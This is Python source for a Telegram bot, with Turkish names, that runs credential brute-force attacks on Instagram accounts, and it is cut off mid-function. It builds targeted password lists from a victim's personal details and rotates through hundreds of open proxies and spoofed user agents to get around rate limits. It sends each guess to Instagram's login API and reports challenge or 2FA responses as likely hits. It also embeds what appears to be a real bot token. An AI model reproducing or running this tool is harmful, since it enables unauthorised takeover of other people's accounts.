#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
import os
import uuid
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError

# Log ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")

# Güvenlik şifresi
BOT_SIFRE = os.getenv("BOT_PASSWORD", "1453")

# Sağlanan statik proxy listesi
PROXY_LISTESI = [
    # Birinci belgedeki proxy'ler
    "185.162.231.94:80", "104.21.16.45:80", "185.162.229.174:80", "185.162.228.198:80",
    "104.25.238.129:80", "46.254.92.108:80", "185.148.107.64:80", "173.245.49.139:80",
    "206.238.236.20:80", "181.214.1.85:80", "104.27.201.213:80", "172.67.43.240:80",
    "194.152.44.139:80", "172.67.167.9:80", "104.16.246.67:80", "104.17.217.204:80",
    "66.81.247.212:80", "23.227.39.103:80", "104.24.216.181:80", "172.67.192.43:80",
    "160.123.255.142:80", "188.42.89.29:80", "104.16.1.86:80", "103.160.204.148:80",
    "31.12.75.24:80", "45.131.4.194:80", "45.80.108.48:80", "104.16.188.186:80",
    "102.177.176.35:80", "185.146.173.237:80", "185.193.31.253:80", "45.131.4.34:80",
    "185.148.106.121:80", "45.194.53.60:80", "172.67.191.21:80", "141.101.123.178:80",
    "172.67.70.40:80", "45.159.218.248:80", "212.183.88.62:80", "170.114.45.72:80",
    "45.12.30.131:80", "104.239.72.64:80", "104.21.29.170:80", "173.245.49.224:80",
    "172.67.94.199:80", "45.131.5.163:80", "141.101.122.83:80", "185.148.106.79:80",
    "172.67.70.72:80", "104.17.48.35:80", "104.17.108.3:80", "194.152.44.135:80",
    "185.174.138.240:80", "23.227.38.29:80", "104.23.131.179:80", "172.67.37.63:80",
    "104.18.194.169:80", "185.238.228.33:80", "104.16.157.211:80", "104.16.249.193:80",
    "5.10.246.153:80", "63.141.128.194:80", "104.18.11.9:80", "45.131.209.38:80",
    "172.67.181.129:80", "104.16.1.220:80", "209.46.30.178:80", "185.162.231.208:80",
    "104.24.37.33:80", "104.27.6.112:80", "185.162.230.189:80", "108.162.193.72:80",
    "141.101.122.63:80", "104.25.1.24:80", "141.101.121.219:80", "104.16.60.8:80",
    "104.16.57.105:80", "104.19.55.188:80", "206.238.236.160:80", "185.193.28.160:80",
    "104.24.56.243:80", "104.18.75.187:80", "185.162.229.197:80", "104.17.5.130:80",
    "172.67.167.50:80", "160.153.0.138:80", "104.16.0.158:80", "5.10.246.194:80",
    "104.21.114.204:80", "104.18.142.117:80", "172.67.212.132:80", "181.214.1.17:80",
    "45.80.111.217:80", "104.16.232.20:80", "104.17.207.237:80", "185.176.24.127:80",
    "104.24.28.105:80", "206.238.236.22:80", "199.34.228.80:80", "185.162.229.149:80",
    "195.245.221.167:80", "104.16.182.70:80", "172.67.69.11:80", "63.141.128.191:80",
    "172.67.70.234:80", "172.64.82.16:80", "104.21.58.104:80", "104.18.18.146:80",
    "104.17.100.64:80", "172.67.185.150:80", "172.67.191.239:80", "205.233.181.254:80",
    "45.131.6.31:80", "104.18.242.95:80", "172.67.180.196:80", "104.21.19.156:80",
    "104.24.1.131:80", "45.12.31.174:80", "54.194.12.135:80", "45.131.7.196:80",
    "104.18.210.30:80", "141.101.121.203:80", "172.67.68.219:80", "45.131.4.140:80",
    "162.159.240.147:80", "45.12.31.26:80", "185.176.24.112:80", "45.12.30.140:80",
    "104.16.2.69:80", "45.131.5.138:80", "104.16.205.30:80", "45.131.211.8:80",
    "141.101.120.105:80", "104.18.194.69:80", "45.12.31.166:80", "185.162.229.232:80",
    "104.16.196.186:80", "172.67.70.210:80", "104.24.7.232:80", "104.16.1.114:80",
    "104.27.26.183:80", "104.27.13.64:80", "173.245.49.10:80", "172.67.203.108:80",
    "198.41.209.183:80", "185.162.230.214:80", "104.17.106.209:80", "104.16.109.243:80",
    "104.16.147.97:80", "104.16.104.85:80", "104.17.161.117:80", "172.67.101.185:80",
    "185.170.166.43:80", "45.131.5.30:80", "141.101.120.141:80", "172.67.179.214:80",
    "104.18.171.140:80", "104.16.0.110:80", "206.238.237.251:80", "62.72.166.130:80",
    "45.131.208.112:80", "45.131.4.19:80", "185.193.31.99:80", "194.36.55.121:80",
    "162.159.242.58:80", "103.21.244.172:80", "104.27.18.75:80", "206.238.239.129:80",
    "104.17.100.227:80", "185.176.24.140:80", "185.170.166.54:80", "104.18.126.74:80",
    "170.114.45.238:80", "185.146.173.174:80", "63.141.128.191:80", "185.162.230.58:80",
    "172.64.149.81:80", "172.67.180.91:80", "185.162.229.143:80", "172.67.117.227:80",
    "141.101.120.212:80", "104.16.1.165:80", "216.205.52.147:80", "172.67.3.84:80",
    "154.194.12.181:80", "104.16.18.211:80", "194.36.55.233:80", "45.131.7.199:80",
    "206.238.237.97:80", "104.24.146.182:80", "104.25.1.0:80", "45.131.210.233:80",
    "45.131.6.227:80", "45.131.210.194:80", "185.18.250.211:80", "198.41.204.180:80",
    "45.67.214.96:80", "104.17.138.169:80", "156.225.72.35:80", "104.19.27.14:80",
    "172.67.184.174:80", "162.159.135.91:80", "206.238.239.32:80", "5.10.245.188:80",
    "45.159.217.6:80", "159.112.235.248:80", "154.194.12.239:80", "45.159.216.24:80",
    "103.165.155.238:2016", "38.156.23.38:999", "116.68.250.46:8080", "103.97.198.253:8080",
    "102.36.156.217:41890", "103.171.255.244:8080", "190.95.202.212:999", "73.31.173.80:8888",
    "103.151.246.18:7777", "62.33.91.10:3129", "45.167.126.105:999", "181.78.107.139:999",
    "123.140.146.46:5031", "103.191.165.146:8090", "190.103.205.253:9097", "103.133.61.182:8083",
    "31.56.78.170:8181", "103.247.23.242:1111", "103.73.75.126:8085", "103.123.25.65:80",
    "165.225.113.220:10958", "104.129.194.43:9443", "202.93.245.34:1111", "147.161.246.38:11814",
    "104.20.55.128:80",
    # İkinci belgedeki proxy'ler
    "188.166.30.17:8888", "37.120.133.137:3128", "37.120.222.132:3128", "89.249.65.191:3128",
    "144.91.118.176:3128", "95.216.17.79:3888", "85.214.94.28:3128", "185.123.143.251:3128",
    "167.172.109.12:39452", "176.113.73.104:3128", "51.158.68.133:8811", "185.123.143.247:3128",
    "95.111.226.235:3128", "176.113.73.99:3128", "206.189.130.107:8080", "79.110.52.252:3128",
    "13.229.107.106:80", "118.99.108.4:8080", "13.229.47.109:80", "169.57.157.148:80",
    "51.158.68.68:8811", "167.172.109.12:40825", "119.81.189.194:80", "119.81.189.194:8123",
    "3.24.178.81:80", "119.81.71.27:80", "119.81.71.27:8123", "185.236.203.208:3128",
    "193.239.86.249:3128", "159.8.114.37:80", "185.123.101.174:3128", "222.129.38.21:57114",
    "185.236.202.205:3128", "193.56.255.179:3128", "35.180.188.216:80", "106.45.221.168:3256",
    "113.121.240.114:3256", "193.34.95.110:8080", "84.17.51.235:3128", "180.183.97.16:8080",
    "193.239.86.247:3128", "185.189.112.157:3128", "121.206.205.75:4216", "103.114.53.2:8080",
    "139.180.140.254:1080", "84.17.51.241:3128", "84.17.51.240:3128", "185.189.112.133:3128",
    "81.12.119.171:8080", "37.120.140.158:3128", "159.89.113.155:8080", "104.248.146.99:3128",
    "185.236.202.170:3128", "67.205.190.164:8080", "46.21.153.16:3128", "51.158.172.165:8811",
    "84.17.35.129:3128", "85.214.244.174:3128", "104.248.59.38:80", "12.156.45.155:3128",
    "161.202.226.194:8123", "167.172.109.12:41491", "167.172.109.12:39533", "115.221.242.131:9999",
    "125.87.82.86:3256", "159.8.114.37:8123", "183.164.254.8:4216", "169.57.157.146:8123",
    "94.100.18.111:3128", "18.141.177.23:80", "193.56.255.181:3128", "116.242.89.230:3128",
    "188.166.252.135:8080", "103.28.121.58:3128", "103.28.121.58:80", "119.84.215.127:3256",
    "217.172.122.14:8080", "79.122.230.20:8080", "167.172.109.12:46249", "176.113.73.102:3128",
    "88.99.10.252:1080", "167.172.109.12:37355", "193.239.86.248:3128", "113.195.224.222:9999",
    "112.98.218.73:57658", "15.207.196.77:3128", "223.113.89.138:1080", "36.7.252.165:3256",
    "113.100.209.184:3128", "185.38.111.1:8080"
]

# Ücretsiz proxy API'leri (yedek olarak)
PROXY_APILERI = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://gimmeproxy.com/api/getProxy?protocol=http",
    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=600",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.openproxylist.xyz/http.txt"
]

# CUPP tarzı şifre oluşturucu yapılandırması
class SifreOlusturucu:
    def __init__(self):
        self.config = {
            "karakterler": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "yillar": [str(yil) for yil in range(1980, 2026)],
            "sayi_baslangic": 0,
            "sayi_bitis": 100
        }
        self.leet_kurallari = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }
        self.maks_sifre_uzunlugu = 512
        self.maks_sifre_sayisi = 100000

    def kelime_listesi_olustur(self, profil: dict) -> List[str]:
        kelime_listesi = []
        ad = profil.get("ad", "").lower()[:20]
        soyad = profil.get("soyad", "").lower()[:20]
        dogum_tarihi = profil.get("dogum_tarihi", "").replace("/", "")[:8]
        evcil_hayvan = profil.get("evcil_hayvan", "").lower()[:20]
        sirket = profil.get("sirket", "").lower()[:20]
        anahtar_kelimeler = [k[:20] for k in profil.get("anahtar_kelimeler", [])]

        temel_kelimeler = [kelime for kelime in [ad, soyad, evcil_hayvan, sirket] if kelime]
        temel_kelimeler.extend(anahtar_kelimeler)

        dogum_tarihi_formatlari = []
        if dogum_tarihi and len(dogum_tarihi) == 8:
            gun, ay, yil = dogum_tarihi[:2], dogum_tarihi[2:4], dogum_tarihi[4:]
            dogum_tarihi_formatlari.extend([gun, ay, yil, yil[-2:], yil[-3:], f"{gun}{ay}", f"{ay}{gun}", f"{gun}{yil}", f"{ay}{yil}"])

        for kelime in temel_kelimeler:
            if len(kelime) <= self.maks_sifre_uzunlugu:
                kelime_listesi.append(kelime)
                kelime_listesi.append(kelime.capitalize())
            for yil in dogum_tarihi_formatlari + self.config["yillar"]:
                if len(f"{kelime}{yil}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{kelime}{yil}")
                    kelime_listesi.append(f"{yil}{kelime}")
            for sayi in range(self.config["sayi_baslangic"], self.config["sayi_bitis"] + 1):
                if len(f"{kelime}{sayi:02d}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{kelime}{sayi:02d}")
                    kelime_listesi.append(f"{sayi:02d}{kelime}")

        for k1, k2 in itertools.combinations(temel_kelimeler, 2):
            if len(kelime_listesi) >= self.maks_sifre_sayisi:
                break
            if len(f"{k1}{k2}") <= self.maks_sifre_uzunlugu:
                kelime_listesi.append(f"{k1}{k2}")
                kelime_listesi.append(f"{k2}{k1}")
                kelime_listesi.append(f"{k1.capitalize()}{k2.capitalize()}")
            for yil in dogum_tarihi_formatlari + self.config["yillar"]:
                if len(f"{k1}{k2}{yil}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{k1}{k2}{yil}")
                    kelime_listesi.append(f"{k2}{k1}{yil}")

        if profil.get("leet_modu", False):
            leet_kelimeler = []
            for kelime in kelime_listesi[:]:
                leet_varyasyonlari = [kelime]
                for karakter, degistirmeler in self.leet_kurallari.items():
                    yeni_varyasyonlar = []
                    for var in leet_varyasyonlari:
                        if karakter in var.lower():
                            for deg in degistirmeler:
                                yeni_var = var.replace(karakter, deg).replace(karakter.upper(), deg)
                                if len(yeni_var) <= self.maks_sifre_uzunlugu:
                                    yeni_varyasyonlar.append(yeni_var)
                    leet_varyasyonlari.extend(yeni_varyasyonlar)
                leet_kelimeler.extend(leet_varyasyonlari)
                if len(kelime_listesi) + len(leet_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(leet_kelimeler)

        if profil.get("ozel_karakterler", False):
            ozel_kelimeler = []
            for kelime in kelime_listesi[:]:
                for karakter in self.config["karakterler"]:
                    if len(f"{kelime}{karakter}") <= self.maks_sifre_uzunlugu:
                        ozel_kelimeler.append(f"{kelime}{karakter}")
                    for karakter2 in self.config["karakterler"]:
                        if len(f"{kelime}{karakter}{karakter2}") <= self.maks_sifre_uzunlugu:
                            ozel_kelimeler.append(f"{kelime}{karakter}{karakter2}")
                if len(kelime_listesi) + len(ozel_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(ozel_kelimeler)

        if profil.get("rastgele_sayi", False):
            sayili_kelimeler = []
            for kelime in kelime_listesi[:]:
                for sayi in range(self.config["sayi_baslangic"], self.config["sayi_bitis"] + 1):
                    if len(f"{kelime}{sayi:02d}") <= self.maks_sifre_uzunlugu:
                        sayili_kelimeler.append(f"{kelime}{sayi:02d}")
                    if len(kelime_listesi) + len(sayili_kelimeler) >= self.maks_sifre_sayisi:
                        break
                if len(kelime_listesi) + len(sayili_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(sayili_kelimeler)

        return list(set(kelime_listesi))[:self.maks_sifre_sayisi]

class InstagramBruteForce:
    def __init__(self):
        self.kullanici_ajani = self._gercekci_kullanici_ajani_al()
        self.proxy_listesi = PROXY_LISTESI.copy()
        self.proxy_onbellek = {}  # Önbellek: {proxy: {'durum': 'çalışıyor'/'engelli'/'başarısız', 'son_kullanim': zaman, 'soguma_suresi_bitis': zaman}}
        self.proxy_dongusu = itertools.cycle(self.proxy_listesi) if self.proxy_listesi else None
        self.mevcut_proxy = None
        self.giris_url = 'https://www.instagram.com/accounts/login/'
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.oturum = None
        self.csrf_token = None
        self.mid_cerez = None
        self.ig_did = None
        self.rollout_hash = None
        self.son_proxy_degisiminden_beri_deneme = 0
        self._baslat()

    def _gercekci_kullanici_ajani_al(self):
        ajanlar = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(ajanlar)

    def _ek_proxyler_al(self):
        proxyler = set()
        for api_url in PROXY_APILERI:
            try:
                yanit = requests.get(api_url, timeout=10)
                if yanit.status_code == 200:
                    if "json" in yanit.headers.get('content-type', ''):
                        veri = yanit.json()
                        if isinstance(veri, list):
                            for proxy in veri:
                                if 'ip' in proxy and 'port' in proxy:
                                    proxyler.add(f"{proxy['ip']}:{proxy['port']}")
                        elif 'ip' in veri and 'port' in veri:
                            proxyler.add(f"{veri['ip']}:{veri['port']}")
                    else:
                        proxy_satirlari = yanit.text.splitlines()
                        for satir in proxy_satirlari:
                            if ':' in satir and satir.strip():
                                proxyler.add(satir.strip())
                    logger.info(f"{api_url} adresinden proxy alındı")
                else:
                    logger.warning(f"{api_url} adresinden proxy alınamadı: HTTP {yanit.status_code}")
            except Exception as e:
                logger.warning(f"{api_url} adresinden hata: {e}")
        if proxyler:
            self.proxy_listesi.extend(list(proxyler))
            self.proxy_dongusu = itertools.cycle(self.proxy_listesi)
            logger.info(f"{len(proxyler)} ek proxy eklendi")
        return list(proxyler)

    def _calisan_proxy_al(self, ilerleme_geri_donusu: Optional[callable] = None):
        if not self.proxy_listesi or not self.proxy_dongusu:
            logger.warning("Proxy listesi boş, ek proxyler alınıyor...")
            self._ek_proxyler_al()
            if not self.proxy_listesi:
                if ilerleme_geri_donusu:
                    ilerleme_geri_donusu("⚠️ Çalışan proxy bulunamadı, proxysiz devam ediliyor...")
                return None

        mevcut_zaman = time.time()
        maks_deneme = min(len(self.proxy_listesi), 10)  # Sonsuz döngüyü önlemek için sınır
        for _ in range(maks_deneme):
            proxy = next(self.proxy_dongusu)
            # Soğuma süresinde veya engelli proxy'leri atla
            if proxy in self.proxy_onbellek:
                onbellek = self.proxy_onbellek[proxy]
                if onbellek['durum'] == 'engelli' or (onbellek.get('soguma_suresi_bitis', 0) > mevcut_zaman):
                    continue

            try:
                test_oturumu = requests.Session()
                test_oturumu.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                test_oturumu.headers.update({'User-Agent': self._gercekci_kullanici_ajani_al()})
                yanit = test_oturumu.get('https://www.instagram.com/', timeout=5)
                if yanit.status_code == 200:
                    test_oturumu.close()
                    self.proxy_onbellek[proxy] = {
                        'durum': 'çalışıyor',
                        'son_kullanim': mevcut_zaman,
                        'soguma_suresi_bitis': 0
                    }
                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
                    if ilerleme_geri_donusu:
                        ilerleme_geri_donusu(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
                else:
                    self.proxy_onbellek[proxy] = {
                        'durum': 'engelli',
                        'son_kullanim': mevcut_zaman,
                        'soguma_suresi_bitis': mevcut_zaman + 600  # 10 dakika soğuma
                    }
                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {yanit.status_code}")
            except Exception as e:
                self.proxy_onbellek[proxy] = {
                    'durum': 'başarısız',
                    'son_kullanim': mevcut_zaman,
                    'soguma_suresi_bitis': mevcut_zaman + 300  # 5 dakika soğuma
                }
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            time.sleep(0.5)

        # Çalışan proxy bulunamazsa ek proxyler al
        logger.warning("Mevcut listede çalışan proxy bulunamadı, ek proxyler alınıyor...")
        self._ek_proxyler_al()
        if self.proxy_listesi:
            self.proxy_dongusu = itertools.cycle(self.proxy_listesi)
            return self._calisan_proxy_al(ilerleme_geri_donusu)
        
        if ilerleme_geri_donusu:
            ilerleme_geri_donusu("❌ Çalışan proxy bulunamadı, proxysiz devam ediliyor...")
        return None

    def _baslat(self):
        self.oturum = requests.Session()
        self.oturum.headers.update({
            'User-Agent': self.kullanici_ajani,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-ASBD-ID': '129477',
            'X-IG-App-Locale': 'tr_TR',
            'X-IG-Device-Locale': 'tr_TR',
            'X-IG-Mapped-Locale': 'tr_TR',
            'X-Pigeon-Session-Id': str(uuid.uuid4()),
            'X-IG-App-ID': '1217981644879628'
        })
        self.mevcut_proxy = self._calisan_proxy_al()
        if self.mevcut_proxy:
            self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}

    async def _ilk_cerez_ve_tokenlari_al(self, ilerleme_geri_donusu: Optional[callable] = None):
        maks_deneme = 10
        for deneme in range(1, maks_deneme + 1):
            self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
            if self.mevcut_proxy:
                self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
            else:
                self.oturum.proxies = {}
            
            try:
                self.oturum = requests.Session()
                self.oturum.headers.update({
                    'User-Agent': self._gercekci_kullanici_ajani_al(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'X-ASBD-ID': '129477',
                    'X-IG-App-Locale': 'tr_TR',
                    'X-IG-Device-Locale': 'tr_TR',
                    'X-IG-Mapped-Locale': 'tr_TR',
                    'X-Pigeon-Session-Id': str(uuid.uuid4()),
                    'X-IG-App-ID': '1217981644879628'
                })
                yanit = self.oturum.get('https://www.instagram.com/', timeout=15)
                if yanit.status_code != 200:
                    raise Exception(f"Instagram'a erişilemedi: {yanit.status_code}")
                
                self.mid_cerez = self.oturum.cookies.get('mid')
                self.ig_did = self.oturum.cookies.get('ig_did')
                yanit = self.oturum.get(self.giris_url, timeout=15)
                self.csrf_token = self.oturum.cookies.get('csrftoken')
                
                if not self.csrf_token:
                    csrf_eslesme = re.search(r'"csrf_token":"([^"]+)"', yanit.text)
                    if csrf_eslesme:
                        self.csrf_token = csrf_eslesme.group(1)
                
                rollout_eslesme = re.search(r'"rollout_hash":"([^"]+)"', yanit.text)
                if rollout_eslesme:
                    self.rollout_hash = rollout_eslesme.group(1)
                else:
                    self.rollout_hash = str(int(time.time()))
                
                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token}, Proxy={self.mevcut_proxy}")
                if ilerleme_geri_donusu:
                    await ilerleme_geri_donusu(f"✅ Token'lar alındı! Proxy: {self.mevcut_proxy}")
                return self.csrf_token is not None
            except Exception as e:
                logger.warning(f"Token alma hatası (Deneme {deneme}/{maks_deneme}): {e}")
                if ilerleme_geri_donusu and deneme % 3 == 0:
                    await ilerleme_geri_donusu(f"🔍 Token'lar alınıyor ({deneme}/{maks_deneme})")
                if deneme < maks_deneme:
                    await asyncio.sleep(5)
                continue
        
        if ilerleme_geri_donusu:
            await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, proxysiz devam ediliyor...")
        return False

    def _giris_istegi_yap(self, kullanici_adi: str, sifre: str, tekrar_deneme: int = 0, maks_tekrar: int = 3):
        basliklar = {
            'Accept': '*/*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': self.giris_url,
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': self.rollout_hash,
            'X-IG-App-ID': '1217981644879628',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
            'X-ASBD-ID': '129477',
            'X-Pigeon-Session-Id': str(uuid.uuid4()),
            'X-IG-App-Locale': 'tr_TR'
        }
        
        zaman_damgasi = int(time.time())
        sifrelenmis_sifre = f"#PWD_INSTAGRAM_BROWSER:0:{zaman_damgasi}:{sifre}"
        
        veri = {
            'username': kullanici_adi,
            'enc_password': sifrelenmis_sifre,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        
        try:
            yanit = self.oturum.post(self.api_url, headers=basliklar, data=veri, timeout=15)
            logger.debug(f"API Yanıtı ({sifre}): {yanit.status_code} - {yanit.text}")
            if yanit.status_code == 429:
                logger.warning(f"Hız sınırı alındı: {sifre}, üstel geri çekilme ile bekleniyor...")
                bekleme = (2 ** tekrar_deneme) * 60  # Üstel geri çekilme: 60s, 120s, 240s
                time.sleep(bekleme)
                if tekrar_deneme < maks_tekrar:
                    self.mevcut_proxy = self._calisan_proxy_al()
                    if self.mevcut_proxy:
                        self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                    else:
                        self.oturum.proxies = {}
                    return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
            return yanit
        except Exception as e:
            logger.warning(f"Giriş isteği hatası ({sifre}): {e}")
            if tekrar_deneme < maks_tekrar:
                self.mevcut_proxy = self._calisan_proxy_al()
                if self.mevcut_proxy:
                    self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                else:
                    self.oturum.proxies = {}
                return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
            return None

    async def kaba_kuvvet(self, kullanici_adi: str, sifre_listesi: List[str], 
                          ilerleme_geri_donusu: Optional[callable] = None, baglam: Optional[ContextTypes.DEFAULT_TYPE] = None):
        baslangic_zamani = time.time()
        toplam_sifre_sayisi = len(sifre_listesi)
        potansiyel_sifreler = set()
        denenmis_sifreler = 0
        sonuclar = []
        self.son_proxy_degisiminden_beri_deneme = 0
        
        try:
            await ilerleme_geri_donusu(f"🚀 Instagram Kaba Kuvvet Başlatılıyor\nHedef: {kullanici_adi}\nŞifre Sayısı: {toplam_sifre_sayisi}")
            
            basari = await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
            if not basari:
                await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, devam ediliyor...")
            
            await ilerleme_geri_donusu(f"✅ Token'lar alındı! Şifre denemeleri başlıyor...")
            
            for i, sifre in enumerate(sifre_listesi):
                # Her 5 denemede proxy değiştir
                if self.proxy_listesi and (self.son_proxy_degisiminden_beri_deneme >= 5):
                    self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
                    if self.mevcut_proxy:
                        self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                    else:
                        self.oturum.proxies = {}
                    await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                    self.son_proxy_degisiminden_beri_deneme = 0
                
                yanit = self._giris_istegi_yap(kullanici_adi, sifre)
                sonuc = "HATA"
                
                if yanit and yanit.status_code == 200:
                    try:
                        json_veri = yanit.json()
                        logger.debug(f"API Yanıtı ({sifre}): {json_veri}")
                        if 'challenge_required' in json_veri or json_veri.get('message') == 'challenge_required':
                            sonuc = "DOĞRULAMA_GEREKLİ"
                            potansiyel_sifreler.add(sifre)
                            logger.info(f"Potansiyel şifre eklendi: {sifre} (DOĞRULAMA_GEREKLİ)")
                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                            await ilerleme_geri_donusu(f"🚧 Doğrulama gerekli! Şifre doğru olabilir: {sifre}. Proxy değiştiriliyor...")
                            self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
                            if self.mevcut_proxy:
                                self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                            else:
                                self.oturum.proxies = {}
                            await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                            self.son_proxy_degisiminden_beri_deneme = 0
                            continue
                        if json_veri.get('authenticated'):
                            sonuc = "BAŞARILI"
                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                            await ilerleme_geri_donusu(f"🎉 BAŞARILI! Şifre bulundu: {sifre}")
                            return sifre
                        elif json_veri.get('authenticated') == False:
                            sonuc = "YANLIŞ"
                        elif json_veri.get('two_factor_required'):
                            sonuc = "2FA"
                            potansiyel_sifreler.add(sifre)
                            logger.info(f"Potansiyel şifre eklendi: {sifre} (2FA)")
                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                            await ilerleme_geri_donusu(f"🔐 2FA gerekli! Şifre doğru: {sifre}")
                            return sifre
                        elif json_veri.get('checkpoint_url'):
                            sonuc = "KONTROL_NOKTASI"
                            potansiyel_sifreler.add(sifre)
                            logger.info(f"Potansiyel şifre eklendi: {sifre} (KONTROL_NOKTASI)")
                            await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                            await ilerleme_geri_donusu(f"🚧 Kontrol noktası gerekli! Şifre doğru: {sifre}")
                            return sifre
                        else:
                            sonuc = "BİLİNMİYOR"
                            potansiyel_sifreler.add(sifre)
                            logger.warning(f"Bilinmeyen yanıt formatı: {json_veri}")
                    except json.JSONDecodeError:
                        sonuc = "HATA"
                        potansiyel_sifreler.add(sifre)
                        logger.error(f"JSON çözümleme hatası: {yanit.text}")
                
                sonuclar.append(sonuc)
                await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                
                denenmis_sifreler += 1
                self.son_proxy_degisiminden_beri_deneme += 1
                
                if (i + 1) % 5 == 0:
                    ozet = f"📊 Son 5 şifre sonucu:\n"
                    for j in range(max(0, i-4), i+1):
                        ozet += f"Şifre {j+1}: {sifre_listesi[j]} - {sonuclar[j]}\n"
                    await ilerleme_geri_donusu(ozet)
                    # Her 5 denemede oturum ve token'ları yenile
                    await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                
                bekleme = random.uniform(30, 60)
                await asyncio.sleep(bekleme)
            
            rapor = f"📊 Rapor:\nDenenen şifreler: {denenmis_sifreler}/{toplam_sifre_sayisi}"
            if potansiyel_sifreler:
                rapor += f"\n⚠️ Potansiyel doğru şifreler (doğrulama/2FA/kontrol noktası): {', '.join(list(potansiyel_sifreler)[:10])}"
                await ilerleme_geri_donusu(rapor)
                if baglam:
                    baglam.user_data['potansiyel_sifreler'] = list(potansiyel_sifreler)
                    baglam.user_data['kullanici_adi'] = kullanici_adi
                    klavye = [
